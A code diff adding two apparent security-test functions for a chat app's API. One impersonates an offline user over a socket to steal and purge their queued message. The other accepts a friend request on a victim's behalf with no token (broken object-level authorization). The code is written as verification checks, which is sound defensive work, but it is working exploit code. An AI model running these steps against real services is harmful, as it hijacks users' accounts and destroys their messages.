@@ -124,6 +124,75 @@ export async function checkImpersonation({ apiUrl, flavor, victim }) {
 }
 
 /**
+ * v0 mailbox drain, end to end:
+ *   1. a sender socket queues a message for the (offline) victim;
+ *   2. an impostor socket emits register_socket(victim) with no credentials;
+ *   3. if the impostor receives the queued payload, the hijack worked, and the
+ *      server has purged it, so the real victim will never see it.
+ */
+export async function checkMailboxDrainV0({ apiUrl, sender, victim }) {
+  const ioClient = loadIoClient();
+  const marker = `queued-for-${victim}-${Date.now()}`;
+  // 1. queue
+  await new Promise((resolve) => {
+    const s = ioClient(apiUrl, { reconnection: false, transports: ["websocket"] });
+    s.on("connect", () => {
+      s.emit("register_socket", sender);
+      s.emit("private_message", { to: victim, from: sender, ciphertext: marker, type: "text" }, () => {
+        s.close();
+        resolve();
+      });
+    });
+    s.on("connect_error", () => resolve());
+    setTimeout(resolve, 5000);
+  });
+  // 2. impersonate
+  return await new Promise((resolve) => {
+    const got = [];
+    const s = ioClient(apiUrl, { reconnection: false, transports: ["websocket"] });
+    const done = () => {
+      s.close();
+      const drained = got.some((m) => m && m.ciphertext === marker);
+      resolve({
+        observed: drained
+          ? `impostor socket registered as ${victim} with no credentials and received the victim's queued message (mailbox drained)`
+          : `impostor received ${got.length} message(s); queued message not obtained`,
+        hijacked: drained,
+        refused: !drained,
+      });
+    };
+    s.on("connect", () => {
+      s.on("receive_message", (m) => got.push(m));
+      s.emit("register_socket", victim);
+      setTimeout(done, 3000);
+    });
+    s.on("connect_error", (e) => resolve({ observed: `connect_error: ${e.message}`, hijacked: false, refused: true }));
+  });
+}
+
+/**
+ * v0 BOLA, end to end: Mallory sends Bob a friend request and then accepts it
+ * on Bob's behalf, with no credentials at all. Success = Mallory appears in
+ * Bob's friend list without Bob doing anything.
+ */
+export async function checkBolaV0({ apiUrl, attacker, victim }) {
+  const post = (path, body) =>
+    fetch(`${apiUrl}${path}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+  const reg = (u) => post("/api/register", { username: u, publicKey: "x", srpSalt: "x", srpVerifier: "x" });
+  await reg(attacker);
+  await reg(victim);
+  await post("/api/request/send", { sender: attacker, receiver: victim });
+  const acc = await post("/api/request/accept", { sender: attacker, receiver: victim });
+  const friends = await fetch(`${apiUrl}/api/friends/${victim}`).then((r) => r.json()).catch(() => ({}));
+  const isFriend = Array.isArray(friends.friends) && friends.friends.includes(attacker);
+  return {
+    observed: `POST /api/request/accept on ${victim}'s behalf (no token) -> HTTP ${acc.status}; ${attacker} ${isFriend ? "IS" : "is not"} in ${victim}'s friend list`,
+    refused: !isFriend,
+    status: acc.status,
+  };
+}
+
+/**
  * BOLA: accept a friend request on someone else's behalf, no/!own token.
  *  - v0: POST /api/request/accept {sender, receiver} with no auth at all.
  *  - v1: same call with no Authorization header (expect 401) — and the route
